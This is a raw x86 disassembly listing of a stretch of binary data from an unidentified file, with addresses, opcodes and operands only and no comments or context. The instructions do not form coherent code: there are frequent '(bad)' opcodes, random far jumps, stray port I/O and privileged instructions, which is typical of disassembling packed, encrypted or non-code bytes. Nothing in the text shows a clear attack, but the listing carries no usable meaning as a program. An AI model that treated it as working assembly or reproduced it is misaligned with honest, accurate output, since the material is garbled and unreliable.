  408d3b:	add    BYTE PTR [edx-0x3f4c4d4],dh
  408d41:	cmp    al,0xf0
  408d43:	repz (bad) 
  408d45:	fidivr DWORD PTR [edi-0x2f86539f]
  408d4b:	cli    
  408d4c:	sahf   
  408d4d:	int3   
  408d4e:	cli    
  408d4f:	scas   al,BYTE PTR es:[edi]
  408d50:	retf   0xfff8
  408d53:	outs   dx,BYTE PTR ds:[esi]
  408d54:	jnp    0x408d06
  408d56:	adc    eax,0x84c99305
  408d5b:	jns    0x408cf3
  408d5d:	das    
  408d5e:	and    DWORD PTR [ecx+0x5c67278b],esi
  408d64:	mov    ebp,0x16884536
  408d69:	dec    ecx
  408d6a:	loop   0x408d84
  408d6c:	inc    eax
  408d6d:	stos   DWORD PTR es:[edi],eax
  408d6e:	lods   eax,DWORD PTR ds:[esi]
  408d6f:	call   0x7986a16b
  408d74:	mov    edx,ecx
  408d76:	inc    esi
  408d77:	mov    ebx,DWORD PTR [ebx-0x13]
  408d7a:	cmp    DWORD PTR [ecx-0x12],ebx
  408d7d:	popf   
  408d7e:	cmp    eax,0xd1b9152b
  408d83:	pop    ebx
  408d84:	das    
  408d85:	sbb    esp,eax
  408d87:	mov    dh,0x61
  408d89:	repz mov ebp,eax
  408d8c:	ja     0x408de2
  408d8e:	cs js  0x408d38
  408d91:	stos   BYTE PTR es:[edi],al
  408d92:	loope  0x408d5c
  408d94:	fidiv  WORD PTR [eax+edx*1]
  408d97:	int    0x6b
  408d99:	les    edi,FWORD PTR [esi-0x80]
  408d9c:	push   ebp
  408d9d:	sti    
  408d9e:	mov    ds:0xab3e42e3,al
  408da3:	xor    DWORD PTR [esi-0x63],edi
  408da6:	inc    ecx
  408da7:	mov    al,0x78
  408da9:	adc    eax,eax
  408dab:	sbb    BYTE PTR [edx+0x171ba42],cl
  408db1:	xor    ecx,ebx
  408db3:	ins    BYTE PTR es:[edi],dx
  408db4:	data16 fdivr QWORD PTR [eax-0x59ada380]
  408dbb:	or     esi,DWORD PTR [ebx]
  408dbd:	mov    al,ds:0xb005696
  408dc2:	mov    ebx,0x8ba6857a
  408dc7:	dec    eax
  408dc8:	mov    DWORD PTR [edx-0x53],esp
  408dcb:	mov    ebx,0xbb12e375
  408dd0:	aaa    
  408dd1:	pop    esi
  408dd2:	loope  0x408da8
  408dd4:	mov    DWORD PTR [ebp+0x6d8cb7aa],ecx
  408dda:	cld    
  408ddb:	(bad)
  408dde:	dec    ebp
  408ddf:	sbb    DWORD PTR [eax-0x6e],0xeddba124
  408de6:	xor    cl,bh
  408de8:	xor    bl,BYTE PTR [esi-0x1ba40987]
  408dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408def:	ret    
  408df0:	mov    ds:0xdb1f79ef,eax
  408df5:	cmp    esp,DWORD PTR [edi+0x48460fe9]
  408dfb:	cdq    
  408dfc:	aam    0x66
  408dfe:	pop    ds
  408dff:	add    ch,BYTE PTR [edx+0x69]
  408e02:	retf   
  408e03:	icebp  
  408e04:	jmp    0x2255cea3
  408e09:	sbb    DWORD PTR [esi-0x61cffc7b],edx
  408e0f:	or     ah,0xcd
  408e12:	popf   
  408e13:	push   eax
  408e14:	mov    al,ds:0x5853be24
  408e19:	mov    ah,0xb5
  408e1b:	out    0x54,al
  408e1d:	jecxz  0x408e1a
  408e1f:	sti    
  408e20:	sti    
  408e21:	adc    al,0x45
  408e23:	push   ecx
  408e24:	pop    ds
  408e25:	(bad)  
  408e26:	in     al,0x9c
  408e28:	jg     0x408e21
  408e2a:	xor    eax,0x9cfe100b
  408e2f:	add    al,BYTE PTR [eax-0x6a]
  408e32:	int    0x1f
  408e34:	add    bh,BYTE PTR [esi]
  408e36:	gs loope 0x408e68
  408e39:	pop    ebx
  408e3a:	imul   edi,esi,0xffffff86
  408e3d:	mov    ch,0x76
  408e3f:	xor    ebp,DWORD PTR [eax]
  408e41:	jl     0x408e38
  408e43:	xor    DWORD PTR [esi-0x6abffe86],esp
  408e49:	xchg   edi,eax
  408e4a:	sbb    eax,0xae318018
  408e4f:	aaa    
  408e50:	sub    ebx,esi
  408e52:	and    BYTE PTR [ecx+ebp*4],0xdb
  408e56:	ror    BYTE PTR [edx+0x29],1
  408e59:	div    dh
  408e5b:	outs   dx,BYTE PTR ds:[esi]
  408e5c:	jo     0x408e8e
  408e5e:	push   ss
  408e5f:	pop    eax
  408e60:	fwait
  408e61:	cli    
  408e62:	jl     0x408ed3
  408e64:	dec    ecx
  408e65:	xchg   edx,eax
  408e66:	dec    eax
  408e67:	fisubr DWORD PTR [ecx+0x61c30263]
  408e6d:	dec    edx
  408e6e:	stos   DWORD PTR es:[edi],eax
  408e6f:	xchg   ebp,eax
  408e70:	and    BYTE PTR [ebp-0x610768ba],dl
  408e76:	aas    
  408e77:	push   0x97bb2c39
  408e7c:	bound  ebp,QWORD PTR [edi]
  408e7e:	ds aam 0xf3
  408e81:	icebp  
  408e82:	test   eax,0x812ed2b
  408e87:	fcom   DWORD PTR ds:0xbbee69e7
  408e8d:	shl    DWORD PTR [ecx+0x4d],cl
  408e90:	mov    al,ds:0xcb51e709
  408e95:	out    0xb4,eax
  408e97:	push   es
  408e98:	arpl   WORD PTR [esi+eax*8],sp
  408e9b:	mov    eax,0x672ca004
  408ea0:	cmp    DWORD PTR ds:0xab019bd8,esp
  408ea6:	xchg   esi,eax
  408ea7:	dec    eax
  408ea8:	pop    esp
  408ea9:	xchg   ebp,eax
  408eaa:	cli    
  408eab:	pop    ebx
  408eac:	sti    
  408ead:	sbb    ebp,ebp
  408eaf:	fistp  QWORD PTR [ebx-0x50747c83]
  408eb5:	jg     0x408e42
  408eb7:	xor    esp,DWORD PTR [edi]
  408eb9:	fimul  DWORD PTR [eax]
  408ebb:	inc    ecx
  408ebc:	adc    eax,0xe7bd8bee
  408ec1:	dec    ebp
  408ec2:	addr16 pop edi
  408ec4:	cmp    al,0xb3
  408ec6:	dec    esi
  408ec7:	ins    BYTE PTR es:[edi],dx
  408ec8:	push   edi
  408ec9:	sub    esp,DWORD PTR [ebp-0x1b850a18]
  408ecf:	jns    0x408e92
  408ed1:	xlat   BYTE PTR ds:[ebx]
  408ed2:	push   esp
  408ed4:	jns    0x408f3c
  408ed6:	jns    0x408ea2
  408ed8:	mov    ds:0xcec93f8f,eax
  408edd:	test   eax,0x3c9f6cb3
  408ee2:	dec    ebp
  408ee3:	mov    ebx,0x7336c3d3
  408ee8:	jle    0x408f41
  408eea:	pop    ecx
  408eeb:	dec    ecx
  408eec:	xor    al,0xb6
  408eee:	mov    cl,0xa8
  408ef0:	ds ja  0x408ea0
  408ef3:	add    eax,0xf5032fed
  408ef8:	xlat   BYTE PTR ds:[ebx]
  408ef9:	push   eax
  408efa:	sbb    BYTE PTR [eax+0x3d54b4e4],dl
  408f00:	retf   
  408f01:	scas   eax,DWORD PTR es:[edi]
  408f02:	cmp    DWORD PTR [eax],ecx
  408f04:	dec    eax
  408f05:	or     BYTE PTR [ecx-0x3437efcc],dh
  408f0b:	add    DWORD PTR [eax+0x7d],esi
  408f0e:	mov    ecx,0xfc99df46
  408f13:	fadd   DWORD PTR [ebx]
  408f15:	shr    BYTE PTR [esi+esi*1-0x13],0x3
  408f1a:	dec    edi
  408f1b:	add    BYTE PTR [edi-0x3bf3827e],cl
  408f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f22:	(bad)  
  408f23:	(bad)  
  408f24:	jg     0x408ef7
  408f26:	bound  esi,QWORD PTR [edi]
  408f28:	mov    edi,?
  408f2a:	(bad)  
  408f2b:	sbb    BYTE PTR [edi],bh
  408f2d:	push   0x35b7283b
  408f32:	push   ecx
  408f33:	iret   
  408f34:	iret   
  408f35:	add    dl,BYTE PTR [eax]
  408f37:	add    BYTE PTR [eax],cl
  408f39:	(bad)  
  408f3a:	enter  0x2184,0x99
  408f3e:	push   es
  408f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f40:	mov    esp,0x892bd023
  408f45:	push   edx
  408f46:	mov    bl,ch
  408f48:	mov    ebp,0x400f763d
  408f4d:	or     dl,BYTE PTR [ebp+0x31]
  408f50:	add    BYTE PTR [ecx+ecx*2-0x6e],0x44
  408f55:	shr    bl,1
  408f57:	mov    WORD PTR es:[esi+0x2906362d],es
  408f5e:	jecxz  0x408f23
  408f60:	cmp    BYTE PTR [ecx+0x725d836],0xdb
  408f67:	push   ecx
  408f68:	leave  
  408f69:	add    cl,BYTE PTR ds:0xf6bcac05
  408f6f:	inc    edi
  408f70:	adc    DWORD PTR [ebx+ecx*8-0x6f],esp
  408f74:	lods   eax,DWORD PTR ds:[esi]
  408f75:	mov    ch,0x3a
  408f77:	ss push 0x74
  408f7a:	hlt    
  408f7b:	sub    eax,0x20000063
  408f80:	add    BYTE PTR [ecx+0x44],cl
  408f83:	inc    ecx
  408f84:	push   esp
  408f85:	popf   
  408f86:	dec    ebx
  408f87:	add    BYTE PTR [eax-0x3c3ba676],dh
  408f8d:	xchg   esp,eax
  408f8e:	sub    eax,0xeb976f75
  408f93:	mov    ecx,0x72c86d4a
  408f98:	shr    DWORD PTR [esi+ebp*1-0x68],0xcd
  408f9d:	sub    eax,0x9592ccb3
  408fa2:	xchg   esi,eax
  408fa3:	scas   al,BYTE PTR es:[edi]
  408fa4:	jbe    0x408f37
  408fa6:	add    dl,BYTE PTR [ebx]
  408fa8:	mov    bl,0x80
  408faa:	clc    
  408fab:	xchg   esi,eax
  408fac:	bound  ebp,QWORD PTR [edx+eax*8+0x5d]
  408fb0:	pop    edx
  408fb1:	mov    BYTE PTR [ebp-0x66247afe],al
  408fb7:	iret   
  408fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb9:	mov    esp,0x3837caf1
  408fbe:	mov    ebp,0xa8a5209d
  408fc3:	sub    BYTE PTR [ecx-0x18],dh
  408fc6:	std    
  408fc7:	out    dx,eax
  408fc8:	lds    eax,FWORD PTR [edi]
  408fca:	adc    al,al
  408fcc:	and    BYTE PTR [eax],ch
  408fce:	mov    edi,0xbf678631
  408fd3:	stc    
  408fd4:	add    bh,BYTE PTR [ebx-0x101c329d]
  408fda:	sti    
  408fdb:	add    bl,bl
  408fdd:	cmp    esp,DWORD PTR [edi+0x38]
  408fe0:	jno    0x408fd4
  408fe2:	sub    al,0xbd
  408fe4:	(bad)  
  408fe5:	rcl    BYTE PTR [edi+0x1625106d],1
  408feb:	neg    DWORD PTR [edi-0xd]
  408fee:	or     eax,esi
  408ff0:	neg    DWORD PTR [esi]
  408ff2:	aas    
  408ff3:	sbb    edx,DWORD PTR [ecx+0x12]
  408ff6:	push   esp
  408ff7:	xchg   esp,eax
  408ff8:	sbb    BYTE PTR ds:0x28a90122,dl
  408ffe:	jmp    0x10e66277
  409003:	pusha  
  409004:	push   ebx
  409005:	(bad)  [ebx+0x2f6258a2]
  40900b:	inc    edx
  40900c:	mov    BYTE PTR [edi+0x44befb80],dh
  409012:	fmul   DWORD PTR [edi+0x66cc0025]
  409018:	rcl    DWORD PTR [ebx-0x40],cl
  40901b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40901c:	sar    dh,0x9c
  40901f:	mov    ch,0xf6
  409021:	pop    ss
  409022:	mov    al,0xe6
  409024:	xor    DWORD PTR [ebx+0x6d],ebp
  409027:	retf   
  409028:	jp     0x408fcf
  40902a:	mov    dh,0xa6
  40902c:	dec    esi
  40902d:	mov    cl,0x82
  40902f:	jb     0x40908c
  409031:	ins    BYTE PTR es:[edi],dx
  409032:	aam    0xd3
  409034:	mov    ebx,0xed0c3f5e
  409039:	jb     0x40900e
  40903b:	cmp    BYTE PTR [ebx-0x2e524adb],bh
  409041:	fs stc 
  409043:	pushf  
  409044:	fldcw  WORD PTR [esi+edi*4-0x18]
  409048:	jne    0x40903a
  40904a:	int3   
  40904b:	pop    eax
  40904c:	or     dl,dl
  40904e:	and    al,0xe1
  409050:	jmp    0x90ad:0xbadc9bd5
  409057:	dec    edx
  409058:	nop
  409059:	and    al,0x4e
  40905b:	icebp  
  40905c:	xchg   ebp,eax
  40905d:	(bad)  
  40905e:	ficom  WORD PTR [esi]
  409060:	adc    cl,0xa8
  409063:	(bad)
  409066:	mov    ebx,ebp
  409068:	mov    ebp,0x94b4a28c
  40906d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40906e:	mov    ebx,0xc7228583
  409073:	fisttp WORD PTR [edi-0x15e6258e]
  409079:	retf   0x1419
  40907c:	repnz or BYTE PTR [ebx],dh
  40907f:	inc    eax
  409080:	mov    al,0x38
  409082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409083:	jbe    0x409053
  409085:	adc    eax,0x7dd77e8a
  40908a:	(bad)  
  40908b:	cdq    
  40908c:	adc    al,0x95
  40908e:	repnz mov ebx,0xd4eae32
  409094:	pop    edx
  409095:	inc    ebx
  409096:	xchg   esi,eax
  409097:	dec    ebx
  409098:	es xor eax,ebx
  40909b:	loope  0x4090f1
  40909d:	xor    BYTE PTR [ebp+0xb8319fb],bl
  4090a3:	dec    ebx
  4090a4:	xchg   ecx,eax
  4090a5:	or     BYTE PTR [edi],dh
  4090a7:	add    ch,BYTE PTR [esi+0x16024981]
  4090ad:	sub    esp,DWORD PTR [edi+0x45635845]
  4090b3:	mov    ebp,0xbce4595c
  4090b8:	cmc    
  4090b9:	cli    
  4090ba:	or     ebp,esp
  4090bc:	mov    WORD PTR [edi*4+0x28a2975e],gs
  4090c3:	push   esi
  4090c4:	xchg   ch,dh
  4090c6:	push   esi
  4090c7:	sub    BYTE PTR [ecx-0x33],cl
  4090ca:	xchg   esi,eax
  4090cb:	push   es
  4090cc:	addr16 pop edi
  4090ce:	idiv   ebx
  4090d0:	jge    0x409066
  4090d2:	push   edx
  4090d3:	cmp    al,0xfb
  4090d5:	(bad)  
  4090d6:	out    0xb9,eax
  4090d8:	jb     0x40913d
  4090da:	retf   0x8f63
  4090dd:	inc    DWORD PTR [ebx+ebx*8]
  4090e0:	cmp    esp,DWORD PTR [edi-0x718ac627]
  4090e6:	outs   dx,BYTE PTR ds:[esi]
  4090e7:	outs   dx,DWORD PTR ds:[esi]
  4090e8:	mov    BYTE PTR [ebp-0x42e012fe],dh
  4090ee:	jb     0x40914a
  4090f0:	push   edx
  4090f1:	test   DWORD PTR [ebx],0x78de82ac
  4090f7:	jnp    0x4090c5
  4090f9:	add    dl,al
  4090fb:	int3   
  4090fc:	inc    eax
  4090fd:	inc    esi
  4090fe:	das    
  4090ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409100:	das    
  409101:	das    
  409102:	dec    ebx
  409103:	call   0x88acad1
  409108:	mov    ah,0xa9
  40910a:	daa    
  40910b:	std    
  40910c:	les    ebp,FWORD PTR [esi+eiz*4+0x22acb2c]
  409113:	adc    BYTE PTR [edi],bh
  409115:	pop    ss
  409116:	lock fisubr DWORD PTR [edi-0x4]
  40911a:	(bad)  
  40911b:	outs   dx,DWORD PTR ds:[esi]
  40911c:	fdiv   QWORD PTR [edi+0x7e41c061]
  409122:	ins    BYTE PTR es:[edi],dx
  409123:	add    BYTE PTR [eax+0x3a],ah
  409126:	cmp    eax,0x34f8107c
  40912b:	mov    BYTE PTR [edi+0x75fcc6b1],bl
  409131:	imul   ecx,ebp,0xffffffd9
  409134:	mov    al,ds:0xf74504f0
  409139:	mov    dh,0x3d
  40913b:	xor    BYTE PTR ds:0x59bce9e,0xad
  409142:	(bad)  
  409143:	pop    eax
  409144:	mov    edi,fs
  409146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409147:	push   edx
  409148:	dec    edx
  409149:	push   esp
  40914a:	xchg   edx,eax
  40914b:	and    bh,BYTE PTR [edi+ebp*2-0x5e]
  40914f:	retf   
  409150:	xchg   edx,eax
  409151:	cmp    al,0x9b
  409153:	mov    ds:0x2c6302cb,eax
  409158:	pop    edx
  409159:	xchg   edi,eax
  40915a:	cwde   
  40915b:	loopne 0x4090ea
  40915d:	or     eax,0xa7e0b82b
  409162:	loopne 0x409194
  409164:	xchg   BYTE PTR [ebx],bl
  409166:	aaa    
  409167:	outs   dx,BYTE PTR ds:[esi]
  409168:	xchg   ebx,eax
  409169:	xchg   edi,eax
  40916a:	cmp    eax,0xa516a54
  40916f:	lahf   
  409170:	push   es
  409171:	in     al,dx
  409172:	pop    edx
  409173:	nop
  409174:	xchg   edx,eax
  409175:	shr    BYTE PTR [ebp+0x2b],1
  409178:	ss push es
  40917a:	sub    DWORD PTR [ebp-0x598b3db2],ebx
  409180:	sub    DWORD PTR [edi-0x59497e64],edx
  409186:	pop    eax
  409187:	dec    esi
  409188:	add    BYTE PTR [edi],0xde
  40918b:	(bad)  
  40918c:	adc    al,0xa2
  40918e:	cmp    ch,BYTE PTR [esi]
  409190:	out    dx,al
  409191:	xchg   edx,eax
  409192:	push   esi
  409193:	cmc    
  409194:	fcom   st(5)
  409196:	ss mov edi,0x8abafda
  40919c:	mov    ds,WORD PTR [esi+0x32]
  40919f:	lods   al,BYTE PTR ds:[esi]
  4091a0:	loope  0x4091be
  4091a2:	pop    esp
  4091a3:	bound  ebx,QWORD PTR [ebx]
  4091a5:	xchg   ecx,eax
  4091a6:	jns    0x4091a8
  4091a8:	aad    0x71
  4091aa:	(bad)  
  4091ab:	fsubr  DWORD PTR [edx-0x3]
  4091ae:	mov    edi,0x80d9773c
  4091b3:	pop    ecx
  4091b4:	push   es
  4091b5:	jns    0x409225
  4091b7:	sub    DWORD PTR [ebx+0x51],ecx
  4091ba:	dec    ebp
  4091bb:	ret    
  4091bc:	lea    ebx,[eax+0x26]
  4091bf:	cmp    dh,BYTE PTR [ebp+0xd69b45e]
  4091c5:	add    DWORD PTR [esi+0x6b],eax
  4091c8:	cs pop ebp
  4091ca:	js     0x4091e5
  4091cc:	cmp    eax,0x43cec2bf
  4091d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d2:	cdq    
  4091d3:	iret   
  4091d4:	out    0x95,eax
  4091d6:	add    BYTE PTR [eiz*4-0x66436a78],0xf0
  4091de:	ror    DWORD PTR [ebx+esi*4-0x13],cl
  4091e2:	cmc    
  4091e3:	jp     0x409259
  4091e5:	cmp    bl,BYTE PTR ds:0x979dfdbe
  4091eb:	js     0x4091e2
  4091ed:	int    0x1b
  4091ef:	cmp    al,0xf8
  4091f1:	call   0x402dcdfd
  4091f6:	inc    ebx
  4091f7:	scas   eax,DWORD PTR es:[edi]
  4091f8:	aas    
  4091f9:	add    al,0x21
  4091fb:	imul   esp,DWORD PTR [ecx+0x552f88c8],0x55
  409202:	sbb    eax,0xecb20e4f
  409207:	cwde   
  409208:	pop    edi
  409209:	push   esp
  40920a:	sbb    eax,0x9868d5d6
  40920f:	cmp    edx,DWORD PTR [eax-0x25]
  409212:	js     0x409276
  409214:	push   ecx
  409215:	mov    edx,DWORD PTR [edx]
  409217:	cmp    DWORD PTR [edx+0x2b],ebx
  40921a:	lods   al,BYTE PTR ds:[esi]
  40921b:	pop    ecx
  40921c:	int    0x0
  40921e:	inc    edx
  40921f:	add    al,0x20
  409221:	sahf   
  409222:	or     ch,BYTE PTR [edx+edi*2]
  409225:	sahf   
  409226:	sti    
  409227:	push   ds
  409228:	add    DWORD PTR [eax-0x67ff9ee1],eax
  40922e:	dec    esp
  40922f:	(bad)  
  409230:	ins    DWORD PTR es:[edi],dx
  409231:	loopne 0x40925f
  409233:	lock imul esp,eax,0x7f31ac17
  40923a:	int    0xc2
  40923c:	mov    al,0x8a
  40923e:	mov    eax,ds:0xcabb0e46
  409243:	add    edi,0x5457da82
  409249:	aas    
  40924a:	push   0x5d
  40924c:	push   edx
  40924d:	dec    ecx
  40924e:	xchg   esp,eax
  40924f:	push   0x84e135b9
  409254:	inc    eax
  409255:	jmp    0x4091e9
  409257:	xor    cl,bl
  409259:	sar    BYTE PTR [edx+0x5ee31b40],1
  40925f:	or     al,0x6e
  409261:	pusha  
  409262:	dec    ecx
  409263:	xchg   esi,eax
  409264:	xchg   edi,eax
  409265:	pop    eax
  409266:	xchg   esi,eax
  409267:	out    0x1,eax
  409269:	inc    esp
  40926a:	or     BYTE PTR [ecx+edx*8-0x748d41a4],cl
  409271:	shl    dh,cl
  409273:	dec    ecx
  409274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409275:	dec    ebx
  409276:	add    ecx,DWORD PTR [esi-0x6c]
  409279:	inc    esp
  40927a:	jns    0x4092b9
  40927c:	xchg   ebx,eax
  40927d:	inc    edx
  40927e:	nop
  40927f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409280:	xchg   edx,eax
  409281:	shl    DWORD PTR [eax],0x65
  409284:	arpl   WORD PTR [ebx],sp
  409286:	loope  0x4092f8
  409288:	push   edx
  409289:	nop
  40928a:	pop    ss
  40928b:	sbb    dh,BYTE PTR [ebx-0x2fa8152c]
  409291:	imul   dl
  409293:	imul   eax,DWORD PTR [ebx+0x71],0xffffff9b
  409297:	(bad)  
  409298:	pop    edx
  409299:	xchg   esi,eax
  40929a:	pop    ecx
  40929b:	inc    eax
  40929c:	dec    ebp
  40929d:	add    dl,al
  40929f:	rcl    BYTE PTR [edx+0x4f],0x5f
  4092a3:	adc    eax,0xe1a84189
  4092a8:	cmp    ecx,DWORD PTR [eax]
  4092aa:	pusha  
  4092ab:	and    eax,edx
  4092ad:	mov    ebp,0x6b009cb8
  4092b2:	add    eax,0xb59eb842
  4092b7:	sub    al,0xd
  4092b9:	jns    0x4092dc
  4092bb:	push   0x29
  4092bd:	shl    DWORD PTR [ecx+0x45],0x9e
  4092c1:	xor    BYTE PTR [ecx],ch
  4092c3:	inc    esi
  4092c4:	inc    ebp
  4092c5:	dec    eax
  4092c6:	jmp    0x9c2a:0x2db76b5f
  4092cd:	mov    cl,0xdc
  4092cf:	mov    eax,0xbf331e76
  4092d4:	int3   
  4092d5:	cdq    
  4092d6:	push   ebx
  4092d7:	fwait
  4092d8:	mov    ch,0x85
  4092da:	xor    DWORD PTR [edx-0x1b],esp
  4092dd:	mov    cs,WORD PTR [ebp-0x80]
  4092e0:	push   ebp
  4092e1:	and    al,ah
  4092e3:	push   ds
  4092e4:	int    0xba
  4092e6:	aad    0x7c
  4092e8:	cli    
  4092e9:	jge    0x409349
  4092eb:	jge    0x4092da
  4092ed:	or     eax,0xafdbecfe
  4092f2:	jo     0x4092d6
  4092f4:	int3   
  4092f5:	jnp    0x409330
  4092f7:	jno    0x4092e3
  4092f9:	sbb    al,0x5b
  4092fb:	(bad)  [edi+0x11360c18]
  409301:	pop    esi
  409302:	stc    
  409303:	sub    eax,0xba2ac6ee
  409308:	fild   QWORD PTR [eax+0x68fd1355]
  40930e:	mov    esi,0xab2ab8b1
  409313:	or     BYTE PTR [eax],al
  409315:	adc    DWORD PTR [eax],ecx
  409317:	push   esp
  409318:	retf   
  409319:	mov    al,ds:0xa0b4d219
  40931e:	aad    0x6a
  409320:	cmp    edx,DWORD PTR [ebx+0x17f53a94]
  409326:	adc    eax,0x4ca9ab8
  40932b:	push   0x6efb9c30
  409330:	inc    ebx
  409332:	(bad)  
  409333:	adc    BYTE PTR [eax],al
  409335:	sbb    al,0x4e
  409337:	(bad)  
  409338:	and    eax,DWORD PTR [ecx]
  40933a:	lahf   
  40933b:	(bad)
  40933e:	mov    dh,0xf0
  409340:	test   al,0xb5
  409342:	test   BYTE PTR [ebx],0xd6
  409345:	fadd   st,st(7)
  409347:	lods   al,BYTE PTR ds:[esi]
  409348:	mov    ch,0xbd
  40934a:	rcl    BYTE PTR [ebx-0x564297d1],1
  409350:	sub    DWORD PTR [esi-0x1b],edi
  409353:	lds    ebp,FWORD PTR [edi-0xa931e36]
  409359:	and    al,0x41
  40935b:	or     BYTE PTR ds:0xf1ac60d6,al
  409361:	icebp  
  409362:	aad    0x12
  409364:	imul   esi,DWORD PTR [edx+ebx*8],0x18
  409368:	out    0x8c,eax
  40936a:	xor    DWORD PTR [esi],eax
  40936c:	ins    DWORD PTR es:[edi],dx
  40936d:	sub    al,0x79
  40936f:	push   ecx
  409370:	inc    esi
  409371:	mov    ds:0x789e5cb3,eax
  409376:	ss fwait
  409378:	xlat   BYTE PTR ds:[ebx]
  409379:	xlat   BYTE PTR ds:[ebx]
  40937a:	outs   dx,DWORD PTR ds:[esi]
  40937b:	ret    
  40937c:	xor    eax,0xce4bad38
  409381:	mov    edi,0xfd68bb5
  409386:	mov    ds:0x20a92414,al
  40938b:	dec    ebp
  40938c:	add    al,0x52
  40938e:	push   es
  40938f:	push   0xa
  409391:	imul   ebp,DWORD PTR [edx],0x6c5b0e19
  409397:	(bad)  
  409398:	ficomp DWORD PTR [esp+ecx*4]
  40939b:	or     esp,esi
  40939d:	jae    0x4093e2
  40939f:	pop    esi
  4093a0:	fadd   DWORD PTR [esi]
  4093a2:	das    
  4093a3:	outs   dx,BYTE PTR ds:[esi]
  4093a4:	call   0xd141:0x5ba57801
  4093ab:	imul   edx,DWORD PTR [esp+edi*2+0x55],0x33
  4093b0:	ins    BYTE PTR es:[edi],dx
  4093b1:	outs   dx,BYTE PTR ds:[esi]
  4093b2:	(bad)  
  4093b3:	aad    0x2d
  4093b5:	outs   dx,BYTE PTR ds:[esi]
  4093b6:	retf   0x92ab
  4093b9:	and    BYTE PTR [edx+0x6ebaae3],0xed
  4093c0:	or     eax,0xf27ac98e
  4093c5:	xchg   edx,eax
  4093c6:	cmc    
  4093c7:	add    eax,DWORD PTR [ebx+0x366599e6]
  4093cd:	jae    0x4093a0
  4093cf:	cmp    BYTE PTR [ecx+0x16],0xcc
  4093d3:	add    BYTE PTR [eax-0x5b],ch
  4093d6:	pop    esi
  4093d7:	inc    ecx
  4093d8:	arpl   WORD PTR [esi-0x6e2d1b24],bx
  4093de:	lods   eax,DWORD PTR ds:[esi]
  4093df:	lea    esi,[ebp-0x3d412114]
  4093e5:	in     eax,dx
  4093e6:	imul   ebx,edi,0xffffffe5
  4093e9:	icebp  
  4093ea:	inc    edi
  4093eb:	mov    dh,0xfd
  4093ed:	xchg   esp,eax
  4093ee:	pop    esi
  4093ef:	retf   
  4093f0:	imul   edi,DWORD PTR [esi-0x653985d5],0xd478205f
  4093fa:	shl    DWORD PTR [eiz*2-0x1e8de3c8],cl
  409401:	ret    0x9e45
  409404:	jns    0x4093fc
  409406:	inc    ebp
  409407:	xchg   BYTE PTR [ebx],bh
  409409:	(bad)  
  40940b:	out    0x81,al
  40940d:	(bad)  
  40940e:	fcomp  st(4)
  409410:	cmp    cl,cl
  409412:	jo     0x4093c8
  409414:	add    eax,DWORD PTR [edx+0x55]
  409417:	sub    al,0x25
  409419:	fadd   QWORD PTR [eax+esi*1+0x1]
  40941d:	loop   0x4093fa
  40941f:	jne    0x409481
  409421:	push   edi
  409422:	scas   eax,DWORD PTR es:[edi]
  409423:	scas   al,BYTE PTR es:[edi]
  409424:	nop
  409425:	adc    al,0x14
  409427:	sti    
  409428:	aaa    
  409429:	add    cl,BYTE PTR [eax+0x4]
  40942c:	jmp    0x3f17:0xe85fad5f
  409433:	xor    eax,0xa6a3a0a6
  409438:	mov    ah,0x5a
  40943a:	cmp    edi,DWORD PTR [esi+0x3d]
  40943d:	test   ebp,esp
  40943f:	test   DWORD PTR [eax-0x7b],ecx
  409442:	adc    BYTE PTR [ecx+ebx*2+0x56],ah
  409446:	lea    ecx,[eax]
  409448:	ins    BYTE PTR es:[edi],dx
  409449:	enter  0xaade,0x8d
  40944d:	out    dx,eax
  40944e:	push   esp
  40944f:	jle    0x4093f9
  409451:	add    BYTE PTR [eax+0x38],dh
  409454:	fidivr WORD PTR [edi]
  409456:	pop    es
  409457:	cld    
  409458:	add    al,BYTE PTR [edx+0x3e63584f]
  40945e:	arpl   WORD PTR [ebp+edi*2+0x68e846dc],bp
  409465:	sbb    ebx,esi
  409467:	ror    BYTE PTR [edx-0xf],cl
  40946a:	add    ebx,esp
  40946c:	out    0x5f,eax
  40946e:	mov    dl,0xd6
  409470:	sub    eax,0x8102cfd
  409475:	sub    DWORD PTR [ecx+0x49],edx
  409478:	or     ebp,DWORD PTR [ecx+0x36810224]
  40947e:	call   0xf785:0x96519b22
  409485:	or     eax,0xd0bc142c
  40948a:	and    eax,0x6a525e45
  40948f:	pop    ebp
  409490:	or     eax,edi
  409492:	adc    BYTE PTR [ebx+0x64],0x6b
  409496:	sub    eax,0xccb4c6f3
  40949b:	push   ss
  40949c:	aaa    
  40949d:	or     BYTE PTR [eax+0x32],ch
  4094a0:	sbb    DWORD PTR [ebx-0xd],esi
  4094a3:	mov    cx,dx
  4094a6:	sub    DWORD PTR [edx+0x5a],edx
  4094a9:	adc    ah,BYTE PTR ds:0xa2d44a90
  4094af:	js     0x4094f3
  4094b1:	inc    edx
  4094b2:	mov    bh,0x23
  4094b4:	popf   
  4094b5:	xor    esi,DWORD PTR [eax+0x283e329f]
  4094bb:	leave  
  4094bc:	or     edi,DWORD PTR [ebp-0x4faaacc8]
  4094c2:	pop    ecx
  4094c3:	sub    esi,DWORD PTR [esi-0x6bd1220f]
  4094c9:	outs   dx,DWORD PTR ds:[esi]
  4094ca:	or     DWORD PTR [edx+ebx*1],edx
  4094cd:	mov    bl,BYTE PTR [eax+edi*2]
  4094d0:	test   al,0x68
  4094d2:	add    BYTE PTR [ecx+esi*1+0x667d135e],cl
  4094d9:	fist   WORD PTR [edx-0x37c9cdbd]
  4094df:	gs aam 0x25
  4094e2:	or     esp,DWORD PTR [edi-0x4c]
  4094e5:	pop    es
  4094e6:	arpl   ax,bx
  4094e8:	xchg   DWORD PTR [ebx+eax*2],eax
  4094eb:	dec    edi
  4094ec:	push   edi
  4094ed:	xchg   esi,eax
